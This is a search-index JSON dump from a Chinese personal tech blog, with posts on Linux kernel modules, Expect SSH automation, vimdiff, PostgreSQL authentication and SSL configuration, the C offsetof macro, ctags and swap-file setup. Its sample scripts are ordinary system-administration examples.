搜索完Linux源码树的信息之后,Makefile继续运行，调用编译.KO 文件的源码文件。 hello_module.c 文件。 3. 生成ko模块make #发现缺失 &lt;bound.h&gt; 等头文件解决:12cd kernel-&amp;lt;version&amp;gt;sudo make oldconfig &amp;&amp; sudo make prepare // 产生缺失的必须模块文件 4. 挂载, 移除， 查看ko模块信息;1234insmod 加载模块 dmesg |grep hello -- 可以查看模块输出到内核信息；lsmod 查看模块rmmod 卸载模块命令 printk函数 - IBM 陈皓 - 内核模块","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Arm","slug":"Arm","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Arm/"},{"name":"Kernel","slug":"Kernel","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Kernel/"}]},{"title":"Expect 自动化运维","slug":"yunwei/Expect-自动化运维","date":"2017-08-27T09:07:05.000Z","updated":"2018-09-29T13:11:04.037Z","comments":false,"path":"2017/08/27/yunwei/Expect-自动化运维/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/08/27/yunwei/Expect-自动化运维/","excerpt":"Expect中最关键的四个命令是send,expect,spawn,interact。 send：用于向进程发送字符串 expect：从进程接收字符串 {捕捉返回信息中的字符串} spawn：启动新的进程 {启动新的进程} interact：允许用户交互","text":"Expect中最关键的四个命令是send,expect,spawn,interact。 send：用于向进程发送字符串 expect：从进程接收字符串 {捕捉返回信息中的字符串} spawn：启动新的进程 {启动新的进程} interact：允许用户交互 1. ［set timeout 30］基本上认识英文的都知道这是设置超时时间的，现在你只要记住他的计时单位是：秒 。timeout -1 为永不超时 2. ［spawn ssh username@ip］ 可用于ssh,scp 等自动化spawn是进入expect环境后才可以执行的expect内部命令，如果没有装expect或者直接在默认的SHELL下执行是找不到spawn命令的。所以不要用 “which spawn“之类的命令去找spawn命令。好比windows里的dir就是一个内部命令，这个命令由shell自带，你无法找到一个dir.com 或 dir.exe 的可执行文件。 它主要的功能是给ssh运行进程加个壳，用来传递交互指令。 3. ［expect “password:”］这里的expect也是expect的一个内部命令，有点晕吧，expect的shell命令和内部命令是一样的，但不是一个功能，习惯就好了。这个命令的意思是判断上次输出结果里是否包含“password:”的字符串，如果有则立即返回，否则就等待一段时间后返回，这里等待时长就是前面设置的30秒 4. ［send “ispass\\r”］这里就是执行交互动作，与手工输入密码的动作等效。 [send “$password\\r”] //此处是使用变量 设置变量可用 set 命令 例: {set password 123456 } 可直接使用 $进行引用 温馨提示： 命令字符串结尾别忘记加上“\\r”，如果出现异常等待的状态可以核查一下。 5. ［interact］执行完成后保持交互状态，把控制权交给控制台，这个时候就可以手工操作了。如果没有这一句登录完成后会退出，而不是留在远程终端上。如果你只是登录过去执行 6. $argv 参数数组expect脚本可以接受从bash传递过来的参数.可以使用[lindex $argv n]获得，n从0开始，分别表示第一个,第二个,第三个….参数 7. 示例Code:./scp-expect.sh ./update/${dest_file} ${username}@${src_ip}:${src_file} ${userpwd} cat scp-expect.sh #!/usr/local/bin/expect set timeout -1 // 设置超时时间， timeout -1 为永不超时 set user [lindex $argv 0] set dest_ip [lindex $argv 1] //使用[lindex $argv n]获得，n从0开始，分别表示第一个,第二个,第三个....参数 //[send &quot;$password\\r&quot;] --&gt; 此处是使用变量 设置变量可用 set 命令 例: {set password 123456 } 可直接使用 $进行引用 set passwd 123456 spawn /usr/bin/ssh $user@$dest_ip //spawn：启动新的进程 {启动新的进程} expect { &quot;yes/no&quot; { send &quot;yes\\r&quot;; expect_continue } // expect_continue; &quot;password&quot; { send &quot;$ispass\\r&quot; } } send &quot;useradd -m Postgres\\r&quot; // 发送到 tty 即将执行的命令 send &quot;passwd Postgres\\r&quot; expect { // 进行捕抓 关键字 &quot;New password:&quot; { send &quot;123456\\r&quot;} &quot;Retype new password:&quot; { send &quot;123456\\r&quot;} } send &quot;cp -rf ~/winpay /home/Postgres/\\r&quot; send &quot;chown -R Postgres:Postgres /home/Postgres/winpay\\r&quot; send &quot;su - Postgres\\r&quot; send &quot;cd ~/winpay/bill_send/ &amp;&amp; make\\r&quot; send &quot;echo 启动bin/bill_send\\r&quot; interact //执行完成后保持交互状态，把控制权交给控制台，这个时候就可以手工操作 expect eof","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Shell/"}]},{"title":"Linux 源码比对工具","slug":"commands/Linux源码比对工具","date":"2017-08-27T05:22:24.000Z","updated":"2018-12-05T11:02:24.100Z","comments":true,"path":"2017/08/27/commands/Linux源码比对工具/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/08/27/commands/Linux源码比对工具/","excerpt":"源程序文件比较和合并一直是软件开发过程中比较重要的组成部分， Window IDE 大行其道， Linux传统命令行工具可能就寥寥无几。 Linux 传统比较工具常用 diff patch 组合 另一个可能就是vimdiff vimdiff : 拥有简洁明了的界面，能对比较结果一目了然，对差异快速定位，容易进行文件合并diff/patch:获取补丁文件，进行全部差异性更改","text":"源程序文件比较和合并一直是软件开发过程中比较重要的组成部分， Window IDE 大行其道， Linux传统命令行工具可能就寥寥无几。 Linux 传统比较工具常用 diff patch 组合 另一个可能就是vimdiff vimdiff : 拥有简洁明了的界面，能对比较结果一目了然，对差异快速定位，容易进行文件合并diff/patch:获取补丁文件，进行全部差异性更改 1. vimdiff 首先检查vimdiff是否可用， vimdiff 同时基于vim 与 diff命令 , vimdiff基础用法: vimdiff filename1 filename2 此处执行vimdiff命令显示结果画面 光标移动 与 上下文展开查看 移动光标，左右两侧屏幕滚动是同步的， 这是因为”scrollbind”选项被设置的结果，vim尽量保证两侧文件对齐. 取消设置: set noscrollbind 2.1 ctrl - w 来控制左右页面切换 2.2 可以使用 h、j、k、l 控制上下左右 2.3 提供快捷键在各个差异点之间快速移动，跳转: 正向: ]c / 反向跳转: [c 2.4 zo (floding open 用于打开折叠) zc(folding close 重新折叠) 可以与第一张图比较差异： 文件合并 将当前文件差异复制到另外一个文件中:dp （diff “put”） 把另一个文件内容复制到当前文件中:do (diff “get”, dg已经被占用) 重新比较文件，来实时反应比较结果： diffupdate 撤销修改&lt; ESC &gt;, u 合并结束后，接下来的操作当前是保存。 qa (quit all) 同时退出，且不保存 wa (write all) 同时保存 wqa(write,then quit all) 同时保存，并退出 qa！(force to quit all) 强制退出，且不保存任何操作 2. diff/patch组合补丁 diff 个人比较常用: diff -ruN filename1 filename2 输入如下: filename2 比 filename1 变化了哪些。 patch IBM patch解析 1patch [option] [origfile] [patchfile] 123diff -ruN filename1 filename2 &gt; patch.log #生成补丁信息文件patch filename1 patch.log #利用patch文件打补丁 比较filename1 与 filename2 差别: 生成信息补丁 。对filename1 进行补全， 此时filename1 将与filename2 信息保持一致;","categories":[{"name":"命令","slug":"命令","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/命令/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Vim","slug":"Vim","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Vim/"}]},{"title":"Tcp/ip无法连接到Postgresql 数据库，SSL关闭状态","slug":"database/tcp-ip-connect-SSL-off","date":"2017-08-26T10:52:47.000Z","updated":"2019-09-18T12:20:04.670Z","comments":true,"path":"2017/08/26/database/tcp-ip-connect-SSL-off/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/08/26/database/tcp-ip-connect-SSL-off/","excerpt":"1. Postgres客户端链接异常 FATAL: no pg_hba.conf entry for host “39.64.198.83”, user “test”, database “testdb”, SSL offQPSQL: Unable to connect 此处两个异常错误 39.64.198.83 ip登陆验证用户test数据库testdb时客户端验证不通过改正: 修改对pg_hba.conf对ip限制即可 SSL OFF 未启用","text":"1. Postgres客户端链接异常 FATAL: no pg_hba.conf entry for host “39.64.198.83”, user “test”, database “testdb”, SSL offQPSQL: Unable to connect 此处两个异常错误 39.64.198.83 ip登陆验证用户test数据库testdb时客户端验证不通过改正: 修改对pg_hba.conf对ip限制即可 SSL OFF 未启用 2. 启用客户端验证 Postgresql 的客户端验证有一个名为 pg_hda.conf 的配置文件控制。 hda的意思是[基于主机的验证](host-based authentication) pg_hda.conf 文件的格式， 具体参数可以参考官方文档 # TYPE DATABASE USER ADDRESS METHOD [auth-options] type 参数可选: local This record matches connection attempts using Unix-domain sockets. Without a record of this type, Unix-domain socket connections are disallowed. 这个记录匹配通过unix套接字的进行的连接请求。没有这种类型的记录，unix套接字连接将会被禁止 host This record matches connection attempts made using TCP/IP. host records match either SSL or non-SSL connection attempts. 这个记录匹配通过TCP/IP的进行的连接请求。host记录匹配SSL或者非SSL的连接 注意：除非服务器带着合适的 listen_addresses 配置参数值启动，否则远程的TCP/IP将不能连接。因为缺省只监听本地回环地址localhost的TCP/IP连接。 hostssl This record matches connection attempts made using TCP/IP, but only when the connection is made with SSL encryption. To make use of this option the server must be built with SSL support. Furthermore, SSL must be enabled at server start time by setting the ssl configuration parameter (see Section 17.9 for more information). 这个记录匹配通过TCP/IP进行的连接请求，但是只能使用SSL加密进行连接。要用这个选项，服务器必须要支持SSL。此外，当服务器启动的时候必须通过设置将SSL启用 hostnossl This record type has the opposite behavior of hostssl; it only matches connection attempts made over TCP/IP that do not use SSL. 这个记录刚好与hostssl的逻辑相反；它只能匹配用TCP/IP但是不用SSL的连接。 Database Specifies which database name(s) this record matches. The value all specifies that it matches all databases. The value sameuser specifies that the record matches if the requested database has the same name as the requested user. The value samerole specifies that the requested user must be a member of the role with the same name as the requested database. 指定记录匹配的数据库名。值all将匹配所有的数据库。值sameuser表示如果请求连接的数据库名和用户名相同，则匹配。值samegroup表示请求的用户必须是与数据库同名的组中的成员。值replication表示如果一个replication的连接被请求，则匹配 user Specifies which database user name(s) this record matches. The value all specifies that it matches all users. Otherwise, this is either the name of a specific database user, or a group name preceded by +. 为这条记录声明所匹配的PostgreSQL用户。值all表示匹配所有用户。否则，它就是特定的数据库用户的名字，组名字可以通过用 + 做组名字前缀来声明 address Specifies the client machine address(es) that this record matches. This field can contain either a host name, an IP address range, or one of the special key words mentioned below. 声明这条记录匹配的客户端机器的地址。这个字段可以包含一个主机名、一个IP地址范围或者下面提到的特殊关键字 METHOD trust 无条件的允许连接。这个方法允许任何人用任意一个PostgreSQL用户登录到PostgreSQL数据库。 reject 无条件的拒绝连接。这对于过滤一个组中的某些主机非常有用，例如，一个reject的行能够阻止一个指定的主机连接。而允许特定的网络中其他主机的连接。 md5 要求客户端提供一个MD5加密的口令进行认证。请查阅Section 19.3节获取详细的信息。 password 要求客户提供一个未加密的密码进行身份验证。因为口令是以明文形式在网络上传递的，所以我们不应该在不安全的网络上使用这个方式。请参阅 Section 19.2.2 获取详细信息。 krb5 使用Kerberos V5来进行认证用户。这只对TCP/IP连接有效。请参阅Section 19.3.5获取详细信息。 ident 获取客户端的操作系统的用户名，然后联系客户端上的ident服务器并检查是否和要求的数据库用户名匹配。Ident认证只对TCP/IP连接有效。如果是本地连接，将会被peer认证方法替换。请参阅Section 19.3.6获取详细信息。 peer 从操作系统获取操作系统的用户名，然后检查它是否和请求的数据库名相匹配。这只对本地连接有效。请参阅Section 19.3.7获取详细信息。 ldap 用LDAP服务器进行认证，请参阅Section 19.3.8获取详细信息。 radius 用RADIUS服务器进行认证。 cert 用SSL客户端证书进行认证，请参阅Section 19.3.10获取详细信息。 pam 使用操作系统提供的可插入的认证模块服务（Authenticate using the Pluggable Authentication Modules）（PAM）。 3.启用Tcp/Ip 链接postgresql.conf 配置文件掌管是否允许Tcp/Ip链接 listen_addresses = &apos;*&apos; #what ip address to listen on; # comma-separated list of addresses; # defaults to &apos;localhost&apos;; use &apos;*&apos; for all 4. SSL加密Postgresql 本机支持使用ssl链接对客户端/服务器通讯协议进行加密，以增强安全性 缺省, Postgresql不会执行任何服务器证书验证，这意味着可以在客户端没有察觉的情况下骗过服务认证(修改DNS记录，接管服务ip地址) 同样位于postgresql.conf配置文件下: ssl = true ssl_cert_file = ‘xxx.pem’ ssl_key_file = ‘xxx.key’ 官方文档 创建自签名证书","categories":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Database/"}],"tags":[{"name":"Postgresql","slug":"Postgresql","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Postgresql/"}]},{"title":"offsetof 函数解析","slug":"cpluscplus/offsetof 偏移函数","date":"2017-08-18T03:55:10.000Z","updated":"2018-11-19T16:05:05.829Z","comments":true,"path":"2017/08/18/cpluscplus/offsetof 偏移函数/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/08/18/cpluscplus/offsetof 偏移函数/","excerpt":"NAME offsetof - offset of a structure member SYNOPSIS #include &lt;stddef.h&gt; size_t offsetof(type, member); DESCRIPTION The macro offsetof() returns the offset of the field member from the start of the structure type. This macro is useful because the sizes of the fields that compose a structure can vary across implementations, and compilers may insert different numbers of padding bytes between fields. Consequently, an element&apos;s offset is not necessarily given by the sum of the sizes of the previous elements. A compiler error will result if member is not aligned to a byte boundary (i.e., it is a bit field). RETURN VALUE offsetof() returns the offset of the given member within the given type, in units of bytes. CONFORMING TO C89, C99, POSIX.1-2001.","text":"NAME offsetof - offset of a structure member SYNOPSIS #include &lt;stddef.h&gt; size_t offsetof(type, member); DESCRIPTION The macro offsetof() returns the offset of the field member from the start of the structure type. This macro is useful because the sizes of the fields that compose a structure can vary across implementations, and compilers may insert different numbers of padding bytes between fields. Consequently, an element&apos;s offset is not necessarily given by the sum of the sizes of the previous elements. A compiler error will result if member is not aligned to a byte boundary (i.e., it is a bit field). RETURN VALUE offsetof() returns the offset of the given member within the given type, in units of bytes. CONFORMING TO C89, C99, POSIX.1-2001. 原型:#define offsetof(s,m) (size_t)&amp;(((s *)0)-&gt;m) example: #include &lt;stdio.h&gt; #include &lt;stddef.h&gt; typedef struct node { int id; int age; char name[12]; char address[32]; }node; int main(void) { printf(&quot;id in node size_t seek %d\\n&quot;, (size_t)&amp;(((node *)0)-&gt;id)); // 原型 printf(&quot;id in node size_t seek %d\\n&quot;, offsetof(node, id)); printf(&quot;age in node size_t seek %d\\n&quot;, offsetof(node, age)); printf(&quot;name in node size_t seek %d\\n&quot;, offsetof(node, name)); printf(&quot;address in node size_t seek %d\\n&quot;, offsetof(node, address)); return 0; } ./offsetof 输出结果: id in node size_t seek 0 id in node size_t seek 0 age in node size_t seek 4 name in node size_t seek 8 address in node size_t seek 20 解析:(size_t)&amp;(((node *)0)-&gt;id) (node *)0 ==&gt; malloc(sizeof(node)) ==&gt; node *pnode; 因为id 是node结构体的第一个元素，在此 去pnode-&gt;id 的地址 其实与 pnode 的地址是一致的， 可以使用 %p 查看输出地址信息 printf(&quot;pnode = %p\\n&quot;, pnode); printf(&quot;&amp;(pnode-&gt;id) = %p\\n&quot;, &amp;(pnode-&gt;id)); pnode = 0x1912010 &amp;(pnode-&gt;id) = 0x1912010 故:(node *)0 ==&gt; node *pnode = (node *)0; 此时的pnode = 0x0000; &amp;(((node *)0)-&gt;id) ==&gt; &amp;(pnode-&gt;id) 即 id 的地址； 最后强转为size_t ;","categories":[],"tags":[{"name":"C/C++","slug":"C-C","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/C-C/"}]},{"title":"命令在bash终端和脚本执行结果不一致问题","slug":"gram/shell_命令在bash终端和脚本执行结果不一致问题","date":"2017-08-17T02:22:07.000Z","updated":"2018-11-19T16:12:26.332Z","comments":false,"path":"2017/08/17/gram/shell_命令在bash终端和脚本执行结果不一致问题/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/08/17/gram/shell_命令在bash终端和脚本执行结果不一致问题/","excerpt":"一: cat checksock.sh[root@pgunimation ~]# cat checksock.sh #!/bin/bash num=$(ps -ef| grep sock | wc -l) echo &apos;Num = &apos; $num","text":"一: cat checksock.sh[root@pgunimation ~]# cat checksock.sh #!/bin/bash num=$(ps -ef| grep sock | wc -l) echo &apos;Num = &apos; $num 发现结果输出并不一致; 二: 修改语句vi checksock.sh num=$(ps -ef| grep sock ) 输出结果 root 808 1 0 Aug12 ? 00:00:36 /usr/bin/python /usr/bin/ssserver -c /etc/shadowsocks.json root 12392 12202 0 22:03 pts/0 00:00:00 ./sock root 12399 12202 0 22:03 pts/0 00:00:00 /bin/bash ./checksock.sh root 12400 12399 0 22:03 pts/0 00:00:00 /bin/bash ./checksock.sh root 12402 12400 0 22:03 pts/0 00:00:00 grep sock 发现本身还输出自己调用sh脚本； 修改为: num=$(ps -ef| grep -v 脚本名 | grep sock | wc -l) grep: -v, --invert-match select non-matching lines","categories":[],"tags":[{"name":"Shell","slug":"Shell","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Shell/"}]},{"title":"vim配置ctags + taglist","slug":"software/vim配置ctags-taglist","date":"2017-08-16T11:11:57.000Z","updated":"2018-12-05T10:56:50.280Z","comments":true,"path":"2017/08/16/software/vim配置ctags-taglist/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/08/16/software/vim配置ctags-taglist/","excerpt":"","text":"基于CentOS Linux release 7.1.1503 (Core) 安装 ctags1yum -y install ctags 安装taglist123456789taglist├── doc│ └── taglist.txt└── plugin └── taglist.vim sudo cp taglist/doc/taglist.txt /usr/share/vim/vim74/doc/ sudo cp taglist/plugin/taglist.vim /usr/share/vim/vim74/plugin/ 配置 .vimrc123456789101112131415161718192021222324252627282930&quot; 设置忽略大小写;set ignorecase&quot; 设置tab 4空格;set tabstop=4set softtabstop=4set shiftwidth=4set expandtab&quot;对齐风格set cino=g0,:0&quot;设置行号set number&quot;共享粘贴板;set mouse=a&quot;自动缩进 与C语言峰哥;set autoindentset cindent&quot; 设置ctags 往上查找;set tags=tags;/let Tlist_Auto_Open=1 &quot;自动打开let Tlist_Show_One_File=1 &quot;只显示当前文件的tagslet Tlist_WinWidth=40 &quot;设置taglist宽度let Tlist_Exit_OnlyWindow=1 &quot;taglist窗口是最后一个窗口let Tlist_Use_Left_Window=1 &quot;在Vim窗口右侧显示taglist窗口; 使用123## 重新生成tags文件ctags -R * vim src/main.c ## 即可显示taglist窗口; 快捷键 help tags ctrl+] 打开并跳转到函数定义处 ctrl+t 返回到上一个标签处 g+] 在当前窗口下显示tag索引信息","categories":[{"name":"Vim篇","slug":"Vim篇","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Vim篇/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Software","slug":"Software","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Software/"}]},{"title":"Window DevDocs","slug":"software/Window-DevDocs","date":"2017-08-16T03:55:51.000Z","updated":"2018-12-05T10:56:08.545Z","comments":false,"path":"2017/08/16/software/Window-DevDocs/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/08/16/software/Window-DevDocs/","excerpt":"devdocs是一个开源的文档浏览应用。跟dash一样，它把HTML源文档转换成带索引的docset规格，以供用户查看。不过devdocs是一个用rails写的web应用而非本地应用，文档作为静态资源由服务器提供，交互则是通过浏览器页面完成。你可以在devdocs.io使用该应用，也可以在自己的电脑上部署它。注意devdocs提供了offline的选项，可以把数据写入到浏览器的indexeddb中，避免了每次从服务器获取数据带来的延迟。","text":"devdocs是一个开源的文档浏览应用。跟dash一样，它把HTML源文档转换成带索引的docset规格，以供用户查看。不过devdocs是一个用rails写的web应用而非本地应用，文档作为静态资源由服务器提供，交互则是通过浏览器页面完成。你可以在devdocs.io使用该应用，也可以在自己的电脑上部署它。注意devdocs提供了offline的选项，可以把数据写入到浏览器的indexeddb中，避免了每次从服务器获取数据带来的延迟。 访问网址： http://devdocs.io/ 本地访问: 即可缓存到浏览器本地;","categories":[{"name":"工具篇","slug":"工具篇","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/工具篇/"}],"tags":[{"name":"Software","slug":"Software","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Software/"},{"name":"Windows","slug":"Windows","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Windows/"}]},{"title":"swap 制作交换分区","slug":"yunwei/Swap交换分区","date":"2017-08-10T03:29:18.000Z","updated":"2017-12-03T03:21:56.320Z","comments":false,"path":"2017/08/10/yunwei/Swap交换分区/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/08/10/yunwei/Swap交换分区/","excerpt":"Linux 交换分区作用: Linux内核为了提高读写效率与速度，会将文件在内存中进行缓存，这部分内存就是Cache Memory(缓存内存)。即使你的程序运行结束后，Cache Memory也不会自动释放。这就会导致你在Linux系统中程序频繁读写文件后，你会发现可用物理内存变少。当系统的物理内存不够用的时候，就需要将物理内存中的一部分空间释放出来，以供当前运行的程序使用。那些被释放的空间可能来自一些很长时间没有什么操作的程序，这些被释放的空间被临时保存到Swap空间中，等到那些程序要运行时，再从Swap分区中恢复保存的数据到内存中。这样，系统总是在物理内存不够时，才进行Swap交换。","text":"Linux 交换分区作用: Linux内核为了提高读写效率与速度，会将文件在内存中进行缓存，这部分内存就是Cache Memory(缓存内存)。即使你的程序运行结束后，Cache Memory也不会自动释放。这就会导致你在Linux系统中程序频繁读写文件后，你会发现可用物理内存变少。当系统的物理内存不够用的时候，就需要将物理内存中的一部分空间释放出来，以供当前运行的程序使用。那些被释放的空间可能来自一些很长时间没有什么操作的程序，这些被释放的空间被临时保存到Swap空间中，等到那些程序要运行时，再从Swap分区中恢复保存的数据到内存中。这样，系统总是在物理内存不够时，才进行Swap交换。 系统的Swap分区大小设置多大才是最优呢？ 关于这个问题，应该说只能有一个统一的参考标准，具体还应该根据系统实际情况和内存的负荷综合考虑，像ORACLE的官方文档就推荐如下设置，这个是根据物理内存来做参考的 4G以内的物理内存，SWAP 设置为内存的2倍。 4-8G的物理内存， SWAP 等于内存大小。 8-64G 的物理内存，SWAP 设置为8G。 64-256G物理内存， SWAP 设置为16G。 Swap交换分区对性能的影响 首先，当物理内存不足以支撑系统和应用程序（进程）的运作时，这个Swap交换分区可以用作临时存放使用率不高的内存分页，把腾出的内存交给急需的应用程序（进程）使用。有点类似机房的UPS系统，虽然正常情况下不需要使用，但是异常情况下， Swap交换分区还是会发挥其关键作用。 其次，即使你的服务器拥有足够多的物理内存，也有一些程序会在它们初始化时残留的极少再用到的内存分页内容转移到 swap 空间，以此让出物理内存空间。对于有发生内存泄漏几率的应用程序（进程），Swap交换分区更是重要，因为谁也不想看到由于物理内存不足导致系统崩溃。 最后，现在很多个人用户在使用Linux，有些甚至是PC的虚拟机上跑Linux系统，此时可能常用到休眠（Hibernate），这种情况下也是推荐划分Swap交换分区的。 其实少量使用Swap交换空间是不会影响性能，只有当RAM资源出现瓶颈或者内存泄露，进程异常时导致频繁、大量使用交换分区才会导致严重性能问题。另外使用Swap交换分区频繁，还会引起kswapd0进程（虚拟内存管理中, 负责换页的）耗用大量CPU资源，导致CPU飙升。 Swap分区空间什么时候使用 系统在什么情况或条件下才会使用Swap分区的空间呢？ 其实是Linux通过一个参数swappiness来控制的。当然还涉及到复杂的算法。 这个参数值可为 0-100，控制系统 swap 的使用程度。高数值可优先系统性能，在进程不活跃时主动将其转换出物理内存。低数值可优先互动性并尽量避免将进程转换处物理内存，并降低反应延迟。默认值为 60。 两种办法修改swappiness参数: 1. 临时修改 1.1 echo 10 &gt; /proc/sys/vm/swappiness 1.2 sysctl vm.swappiness=10 2. 永久修改 2.1 echo &apos;vm.swappiness=10&apos; &gt;&gt; /etc/sysctl.conf 配置Linux交换分区:1. dd 制作swap交换分区:dd if=/dev/zero of=/media/swap bs=1024 count=1048576 建立1.1G 名称为swap交换文件 2. mkswap 格式化建立为swap分区[root@localhost media]# mkswap swap Setting up swapspace version 1, size = 1048572 KiB no label, UUID=813e76bc-e187-4d29-99d0-c577d4a11de3 3. 进行swap交换分区挂载： swapon[root@localhost media]# swapon swap swapon: /media/swap: insecure permissions 0644, 0600 suggested. Ps: 发现原先制作文件权限为644，系统认为不安全， 建议修改为600 chmod 600 /media/swap 此时已经被挂载: 1234[root@localhost media]# free total used free shared buff/cache available Mem: 1032040 59124 74604 13168 898312 803308 Swap: 1048572 0 1048572 1. 关闭交换分区 swapoffswapoff /media/swap [root@localhost media]# swapoff /media/swap [root@localhost media]# [root@localhost media]# free total used free shared buff/cache available Mem: 1032040 58500 70876 13168 902664 804028 Swap: 0 0 0 此时仅仅是临时生效，为了能够让swap自动挂载，要修改/etc/fstab文件 vi /etc/fstab 在文件末尾加上 /media/swap swap swap defaults 0 0 等同 UUID=813e76bc-e187-4d29-99d0-c577d4a11de3 swap swap defaults 0 0 #填写mkswap 时产生的uuid 这样就算重启系统，swap分区就不用手动挂载了。 4. 字段定义 /etc/fstab 文件包含了如下字段，通过空格或Tab分隔: &lt;file system&gt; &lt;dir&gt; &lt;type&gt; &lt;option&gt; &lt;dump&gt; &lt;pass&gt; &lt; file system &gt; – 要挂在的分区或存储设备 &lt; dir &gt; – &lt; file system &gt;的挂载位置 &lt; type &gt; – 要挂在设备或是分区的文件系统类型，支持许多种不同的文件系统:ext2, ext3, ext4, reiserfs. xfs, jfs, smbfs, iso9660, fat, ntfs, swap, 以及auto， 设置为auto类型，mount命令会猜测使用的文件系统类型，对CDROM 和 DVD 移动设备非常有用。 &lt; options &gt; – 挂载时使用的参数，常用参数: auto – 在启动时键入了mount -a命令时自动挂载 noauto – 只在你的命令下被挂载 exec – 允许执行此分区的二进制文件 noexec – 不允许执行此文件系统上的二进制文件 ro – 以只读模式挂载文件系统 rw – 以读写模式挂载文件系统 user – 允许任意用户挂载此文件系统，若无显示定义，隐含启用 noexec，nosuid，nodev参数 users – 允许所有users组中的用户挂载文件系统 nouser – 只能被root挂载 owner – 允许设备所有者挂载 sync – I/O同步进行 async – I/O异步进行 dev – 解析文件系统上的块特殊设备 nodev – 不解析文件系统上的块特殊设备 suid – 允许suid 操作和设定sgid位，这一参数通常用于一些特殊任务，是一般用户运行时临时提升权限 nosuid – 禁止suid操作和设定sgid位 noatime – 不更新文件系统上inode访问记录，可以提升性能(atime) nodiratime – 不更新文件系统上的目录inode访问记录，可以提升性能(atime) relatime – 实时更新inode access记录，只有在记录中的访问时间早于当前访问才会被更新(atime) flush – vfat选项，更频繁的刷新数据，复制对话框或进度条在全部数据都写入后才消失 defaults – 使用文件系统的默认挂载参数，例如 ext4 的默认参数为 rw，suid，dev， exec， auto， mouser，async &lt; dump &gt; – dump工具通过它决定何时做备份，dump会检查其内容，并用数字来决定对这个文件系统进行备份，允许的数字是0和1， 0标示忽略， 1则进行备份， 大部分用户并没有安装dump， 对他们来说，应当设置为0 &lt; pass &gt; – fsck读取&lt; pass &gt;的数值来决定需要检查的文件系统的检查顺序，允许的数字0，1和2， 根目录应当获取最高的优先权1 其他所有需要被检查的设备设置为2， 0表示设备不会被fsck所检查。 5. 文件系统的标识1. 在/etc/fstab 配置文件中你可以采用三种表示文件系统，内核名称 ，uuid或者label。 使用uuid或是label的好处在于他们与磁盘顺序无关，如果在bios中改变了你的存储设备顺序，或者重新插拔存储设那么使用uuid或者label将会更加有效 root@iTOP4412-ubuntu-desktop:~# lsblk -f NAME FSTYPE LABEL MOUNTPOINT mmcblk0 ├─mmcblk0p1 ├─mmcblk0p2 ext3 / ├─mmcblk0p3 ext3 /media/517cbd48-ef56-5b23-5473-c03ff34d5f1a └─mmcblk0p4 ext3 /media/bf00f10e-5ddb-90e9-c2f7-2ec4ed55592","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"}]},{"title":"iTop 4412 移植QtE5.7","slug":"arm-4412/iTop-4412-移植QtE5-7","date":"2017-08-09T02:11:58.000Z","updated":"2018-12-05T10:58:04.993Z","comments":false,"path":"2017/08/09/arm-4412/iTop-4412-移植QtE5-7/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/08/09/arm-4412/iTop-4412-移植QtE5-7/","excerpt":"配套组件: Ubuntu环境: Ubuntu 16.04 arm 编译器: arm-20140.05-29 触摸tslib: 1.4版本 QtE 源码: QtE5.7.0","text":"配套组件: Ubuntu环境: Ubuntu 16.04 arm 编译器: arm-20140.05-29 触摸tslib: 1.4版本 QtE 源码: QtE5.7.0 1. 编译器环境变量的配置: 加入到PATH arm-none-inux-gnuwabi-gcc -v 异常:sudo apt-get install lib32zl lib32ncurses5 ia-32libs 2. 编译tslib –触摸屏代码; 解压源码 tslib-1.4.tar.gz sudo apt-get install autoconf sudo apt-get install automake sudo apt-get install libtool ./autogen.sh ./configure CC=arm-none-linux-gnueabi-gcc CXX=arm-none-linux-gnueabi-g++ --host=arm-none-linux-gnueabi -prefix=/opt/tslib1.4 make &amp;&amp; make install //将会被安装在 /opt/tslib1.4/ 目录下； 3. Qt源码编译。 将gcc g++编译器修改为arm交叉编译器即可;1. vi qt-everywhere-opensource-src-5.7.0/qtbase/mkspecs/linux-arm-gnueabi-g++/qmake.conf # # qmake configuration for building with arm-linux-gnueabi-g++ # MAKEFILE_GENERATOR = UNIX CONFIG += incremental QMAKE_INCREMENTAL_STYLE = sublib QT_QPA_DEFAULT_PLATFORM = linux #eglfs QMAKE_CFLAGS_RELEASE += -O2 -march=armv7-a QMAKE_CXXFLAGS_RELEASE += -O2 -march=armv7-a include(../common/linux.conf) include(../common/gcc-base-unix.conf) 